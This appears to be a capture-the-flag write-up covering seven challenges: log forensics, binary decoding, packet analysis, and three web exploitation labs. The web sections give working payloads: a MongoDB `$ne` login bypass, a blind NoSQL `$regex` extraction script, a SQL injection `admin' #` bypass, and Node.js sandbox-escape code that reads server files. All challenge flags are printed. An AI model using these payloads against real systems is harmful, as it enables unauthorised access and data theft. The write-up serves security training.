# CTF

## Table of Contents
- [Challenge 1: Events Never Lie](#challenge-1-events-never-lie)
- [Challenge 2: False Utility](#challenge-2-false-utility)
- [Challenge 3: Network](#challenge-3-network)
- [Challenge 4: Status Board](#challenge-4-status-board)
- [Challenge 5: The Wire](#challenge-5-the-wire)
- [Challenge 6: Library Repository](#challenge-6-library-repository)
- [Challenge 7: NeoTaxCalc](#challenge-7-neotaxcalc)

---

## Challenge 1: Events Never Lie

### Steps

**Question 1 — When was Windows Defender Real-Time Protection disabled?**

1. Download and extract the `.zip` package to the Desktop into a `Logs` folder.
2. Clone Chainsaw and use it to search the logs for **Event ID 5001** (Real-Time Protection disabled).
3. One result is returned with the timestamp.

**Answer:** `2024-04-17_14:27:08`

> 📸 _Add screenshot_

---

**Question 2 — What was the most commonly detected item and when?**

Using Chainsaw to search the logs, the most commonly detected item was **Malicious PowerShell**.

**Answer:** `2024-04-17_14:28:00`

> 📸 _Add screenshot_

---

**Question 3 — Which log file contained the malicious payload?**

Found in the same Chainsaw output as Question 2.

**Answer:** `Microsoft-Windows-PowerShell`

> 📸 _Add screenshot_

---

**Question 4 — What XOR key was used in the payload? (Event ID 4104)**

Used Chainsaw to search for **Event ID 4104** (Script Block Logging). The returned code revealed:

```powershell
$var_code[$x] = $var_code[$x] -bxor 35
```

**Answer:** `35`

> 📸 _Add screenshot_

---

### Flag

```
HTB{P0w3rSh3ll_s0m3t1m3s_l13_th0ugh!_641988b99aaeee4d4ad0dac993379d3d}
```

### Summary

The attacker gained access to the Windows workstation and disabled Windows Defender Real-Time Protection at `2024-04-17 14:27:08`, removing the machine's primary malware defense. At `14:28:00`, a PowerShell script was executed, triggering Sigma rule alerts for **Malicious PowerShell Keywords** and **Potential Suspicious PowerShell Keywords**. The script used an **XOR encoding scheme with the decimal key `35`** to obfuscate its payload. Chainsaw was essential in parsing the raw `.evtx` event logs and reconstructing the attack chain.

---

## Challenge 2: False Utility

### Steps

1. The provided `.zip` contained a binary file named `cat`.
2. After extraction, `cd`'d to the directory and ran `strings` to read its printable contents.
3. Identified indicators of an **ARM64 binary** — cannot run natively on x86 machines.
4. The output also indicated the binary is capable of reading and processing a file upon execution.
5. Wrote a Python script to reverse the encoding algorithm — a **rolling XOR with an accumulator** followed by a **final XOR with `0x55`** on each byte.
6. Running the script decoded the flag in plaintext.

> 📸 _Add screenshot_

### Flag

```
HTB{WHY_TH3Y_L34V1N_M4RK5}
```

### Summary

The challenge provided a binary named `cat` that was an ARM64 executable — not runnable on standard x86 hardware. Static analysis via `strings` revealed its file-processing capability. A Python script was used to reverse the encoding (rolling XOR + final XOR with `0x55`), which decoded directly to the flag.

---

## Challenge 3: Network

### Steps

1. Download and extract the `.zip` attachment to the PWNBOX Desktop.
2. Analyze the `.pcap` file for **Modbus protocol** traffic using `tshark`:

```bash
tshark -r /home/USER/Desktop/capture.pcap -Y "modbus" -x | head -100
```

3. The hex output revealed a pattern of values being sent one by one (e.g., `01 10 00 64`, `01 10 00 6a`, etc.). A quick Python one-liner decoded the initial string:

```bash
python3 -c "vals = [0x64,0x6a,0x6e,0x77,0x45,0x4b,0x32,0x6d,0x32,0x6b,0x6c,0x6d,0x64,0x6f,0x6b]
print(''.join(chr(v) for v in vals))"
```

4. To retrieve the full message, filtered for **Modbus function code 16** (Write Multiple Registers), extracted column 13 from the hex dump, and converted each byte to ASCII:

```bash
tshark -r /home/USER/Desktop/capture.pcap -Y "modbus.func_code == 16" -x \
  | grep "0040" | awk '{print $13}' \
  | while read val; do printf "\\x$val"; done; echo
```

> 📸 _Add screenshot_

### Flag

```
HTB{MOd8u5_23rO_3CnRYp7IoNT@x30}
```

---

## Challenge 4: Status Board

### Steps

1. Start the challenge environment and navigate to the website — a mock company status board backed by **MongoDB**.
2. The goal: leak sensitive information from the database via **NoSQL injection**.
3. Used `curl` to authenticate as `admin` by bypassing the password check with a MongoDB `$ne` operator:

```bash
curl -s -X POST http://IP_ADDRESS:PORT/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":{"$ne":""}}' \
  -c cookies.txt
```

Successfully authenticated as `admin`.

4. Wrote a Python script (saved as `script.py` on the Desktop) to extract the flag character-by-character using **blind NoSQL injection** with the `$regex` operator:

```python
import requests, string, re, json

url = "http://IP_ADDRESS:PORT/api/login"
headers = {"Content-Type": "application/json"}
flag = "HTB{"
chars = string.ascii_letters + string.digits + "!@#$%^&_-"

while not flag.endswith("}"):
    for c in chars:
        escaped = re.escape(flag + c)
        payload = json.dumps({"username": "admin", "password": {"$regex": f"^{escaped}"}})
        r = requests.post(url, headers=headers, data=payload)
        if r.json().get("logged") == 1:
            flag += c
            print(f"Found: {flag}")
            break

print(f"\nFlag: {flag}")
```

5. The script iterates character by character, testing each against the database until the full flag is assembled.

> 📸 _Add screenshot_

### Flag

```
HTB{t0b3_5qL_0r_n05qL_7h4t_is_th3_Q}
```

---

## Challenge 5: The Wire

### Steps

1. Connected to the target via `netcat`, downloaded and extracted the `.zip`, and opened the `.pcapng` file in **Wireshark**.

| Question | Method | Answer |
|----------|--------|--------|
| Total packet count | Bottom-right of Wireshark window | _(see screenshot)_ |
| Timestamp of first packet (epoch seconds) | Expand Frame section → Epoch Time | _(see screenshot)_ |
| Packets from `192.168.1.103` → `151.101.129.140` | Filter: `ip.src == 192.168.1.103 && ip.dst == 151.101.129.140` | `679` |
| Bytes from `192.168.1.108` → `116.203.58.90` | Same filter → Statistics → Conversations | `772` |
| Packets with length 121 bytes | Filter: `frame.len == 121` | `13` |
| Packets with `151.101.129.140` as src OR dst | Filter: `ip.src == 151.101.129.140 \|\| ip.dst == 151.101.129.140` | `1485` |
| Total TCP packets | Filter: `tcp` | `13679` |
| Destination MAC on packet #374 | Packet 374 → Ethernet II pane | `ff:ff:ff:ff:ff:ff` (Broadcast) |
| MAC address of `192.168.1.103` | Filter: `ip.src == 192.168.1.103` → Ethernet II → Source | `08:00:27:ed:96:4b` |
| Host header of HTTP GET for `success.txt` | Filter: `http` → locate GET request → Hypertext Transfer Protocol → Host | `detectportal.firefox.com` |
| First 4 bytes of Layer 3 on packet #11492 | Packet 11492 → IPv4 pane → hexdump | `45000569` |
| Sequence & Acknowledge on packet #18632 | Packet 18632 → TCP pane | `544:1820950` |

> 📸 _Add screenshots for each question_

### Flag

```
HTB{I_g0t_th3_w1r3_4nd_y0u_g0t_th3_fl@g!!_b2e7ceb8ee35e95fca0dd19c1a81a59e}
```

---

## Challenge 6: Library Repository

### Steps

1. Start the Docker machine and navigate to the login page at `http://IP_ADDRESS:PORT`.
2. Right-click → **Inspect** → **Network** tab to monitor requests.
3. Tested with a single apostrophe `'` as the username — confirmed the backend is vulnerable to SQL injection.
4. Used the following payload as the username to bypass authentication:

```
admin' #
```

This works because the backend SQL query likely resembles:

```sql
SELECT * FROM users WHERE username = '$user' AND password = '$password';
```

The `#` comments out the password check entirely, granting access as `admin`.

> 📸 _Add screenshot_

### Flag

```
HTB{byp4553d_au7h37ic4t10n_v1a_1nj3c710n}
```

---

## Challenge 7: NeoTaxCalc

### Steps

1. Start the Docker machine and navigate to the tax calculator — two input fields: **Income** and **Deductions**.
2. Tested with `7*7` in the Income field and `0` in Deductions — the equation evaluated correctly, confirming **server-side JavaScript execution**.
3. Injected a **Server-Side Template Injection (SSTI) / RCE payload** into the Income field to list files in the current directory:

```javascript
(function(){ return JSON.stringify(this.constructor.constructor('return process')().mainModule.require('fs').readdirSync('.')) })() /
```

**Result:** `flag.txt` was present among the returned files.

4. Injected a second payload to read the flag file:

```javascript
(function(){ return this.constructor.constructor('return process')().mainModule.require('fs').readFileSync('flag.txt', 'utf8') })() //
```

> 📸 _Add screenshot_

### Flag

```
HTB{N3xT_t1m3_t3lL_M3_53RV3R51D3_j5_f31f6e82aa216dc0e131d4e27d58a193}
```
